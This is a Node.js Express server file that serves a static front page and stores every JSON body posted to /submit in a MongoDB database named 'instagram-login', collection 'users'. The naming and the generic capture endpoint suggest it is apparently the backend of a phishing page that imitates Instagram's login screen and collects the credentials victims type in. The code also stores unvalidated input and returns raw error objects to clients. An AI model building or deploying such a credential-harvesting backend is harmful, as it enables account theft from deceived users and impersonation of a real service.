const express = require("express");
const path = require("path");
const { MongoClient } = require("mongodb");
require("dotenv").config();

const app = express();
const port = process.env.PORT || 10000;
const mongoUri = process.env.MONGODB_URI;

// Middleware to serve static files from the "public" folder
app.use(express.static(path.join(__dirname, "public")));
// Middleware to parse JSON
app.use(express.json());

let dbClient;

// MongoDB connection
async function connectToDatabase() {
  try {
    dbClient = new MongoClient(mongoUri);
    await dbClient.connect();
    console.log("Connected to MongoDB successfully.");
  } catch (error) {
    console.error("Failed to connect to MongoDB:", error);
    process.exit(1); // Exit if connection fails
  }
}

// Call the database connection function
connectToDatabase();

// API endpoint to insert data into MongoDB
app.post("/submit", async (req, res) => {
  try {
    const data = req.body;
    const database = dbClient.db("instagram-login"); // Replace with your database name
    const collection = database.collection("users"); // Replace with your collection name

    // Insert data into MongoDB
    const result = await collection.insertOne(data);
    res.status(201).json({ message: "Data inserted successfully", result });
    console.log("Data inserted:", result);
  } catch (error) {
    console.error("Error inserting data:", error);
    res.status(500).json({ message: "Failed to insert data", error });
  }
});

// Serve index.html at the root URL
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
